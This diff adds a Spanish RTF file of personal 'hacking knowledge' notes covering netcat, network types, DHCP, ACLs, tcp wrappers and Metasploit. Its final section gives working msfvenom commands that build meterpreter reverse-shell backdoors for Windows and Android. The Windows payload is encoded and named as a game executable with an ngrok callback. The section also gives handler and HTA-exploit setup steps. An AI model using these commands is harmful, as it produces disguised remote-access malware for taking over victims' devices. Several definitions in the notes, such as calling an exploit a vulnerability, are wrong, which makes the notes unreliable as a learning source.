@@ -1,0 +1,126 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2577
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fnil\fcharset0 HelveticaNeue-Bold;\f1\fnil\fcharset0 HelveticaNeue;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\deftab560
+\pard\pardeftab560\partightenfactor0
+
+\f0\b\fs40 \cf0 Conocimientos Hacking\
+\pard\pardeftab560\slleading20\partightenfactor0
+
+\f1\b0\fs26 \cf0 \
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf0 \
+\
+\pard\pardeftab560\sa40\partightenfactor0
+
+\f0\b\fs32 \cf0 Netcat.\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+
+\f1\b0\fs26 \cf0 \
+\pard\pardeftab560\slleading20\partightenfactor0
+\cf0 Como usar netcat para reverse shell:\
+nc -n -v -l -p 8888\
+\
+Que es una reverse shell?\
+Es una shell remota.\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf0 \
+\
+\pard\pardeftab560\sa40\partightenfactor0
+
+\f0\b\fs32 \cf0 Redes.\
+\pard\pardeftab560\slleading20\partightenfactor0
+
+\f1\b0\fs26 \cf0 \
+Tipo de redes inform\'e1ticas:\
+PAN: es una red de pocos metros que se utiliza para la comunicaci\'f3n entre distintos dispositivos cercanos al punto de acceso.\
+LAN: Es una red local.\
+MAN: Es una red de alta velocidad y estas ofrecen conectividad a ciudades y pueblos.\
+WAN: Es una red que une varias redes locales.\
+GAN: Es una red global.\
+VPN: Es una red privada, se usan para conectar redes LAN en Internet o para poder lograr el acceso remoto a una red o a un \'fanico ordenador a trav\'e9s de una conexi\'f3n p\'fablica.\
+\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf0 \
+\pard\pardeftab560\slleading20\partightenfactor0
+
+\f0\b \cf0 Intrusiones en redes locales\
+\pard\pardeftab560\slleading20\partightenfactor0
+
+\f1\b0 \cf0 \
+Que es honeypot?\
+es un se\'f1uelo para usuarios no autorizados.\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf0 \
+\pard\pardeftab560\slleading20\partightenfactor0
+\cf0 que es DHCP?\
+DHCP es un protocolo?\
+\
+Como ver la gente que esta conectada en tu red.\
+Se puede ver desde la DHCP.\
+\
+Que es un protocolo?\
+un protocolo es algo que hace que dos cosas de un sistema o red se comuniquen entre ellos con el fin de transmitirse informacion.\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf0 \
+\pard\pardeftab560\slleading20\partightenfactor0
+\cf0 Que es una ACL?\
+es Acces Control List\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf0 \
+\pard\pardeftab560\slleading20\partightenfactor0
+\cf0 Que es un tcp wrapper?\
+un sistema de red ACL.\
+\uc0\u8232 Que programas usa un tcp wrapper?\u8232 1) tcpd\
+2) tcpdmatch\
+3) tcpdchk\
+4) safe-finger\
+5) try-form\
+\
+\
+\pard\pardeftab560\sa40\partightenfactor0
+
+\f0\b\fs32 \cf0 Hacking General\
+\pard\pardeftab560\slleading20\partightenfactor0
+
+\f1\b0\fs26 \cf0 Que es un payload?\
+un payload es un script que se usa en una vulnerabilidad encontrada previamente \'f3sea en un expolio.\
+\
+Que es un exploit?\
+es una vulnerabilidad.\
+\
+\pard\pardeftab560\sa40\partightenfactor0
+
+\f0\b\fs32 \cf0 Metasploit\
+\pard\pardeftab560\slleading20\partightenfactor0
+
+\f1\b0\fs26 \cf0 \
+como hacer una backdoor con metasploit?\
+\
+para  windows:\
+msfvenom \'96a x86 \'96platform windows -p windows/meterpreter/reverse_tcp LHOST=tcpngrok LPORT=portngrok \'96e x86/shikata_ga_nai \'96f exe> juego.exe\
+\
+para android:\
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=8080 R > nombredearchivo.apk\
+\
+luego:\
+use exploit/multi/handler\
+set payload windows/meterpreter/reverse_tcp\
+set LHOST localhost\
+set LPORT portreal\
+exploit\
+\
+cual es el metodo de infecci\'f3n?\
+msfvenom\
+\
+Como hacer un Hta exploit?\
+msfconsole\
+use exploit/windows/misc/hta_server\
+set lhost 192.168.1.102\
+set srvhost 192.168.1.102\
+set payload windows/meterpreter/reverse_tcp\
+set port 8080\
+exploit\
+}
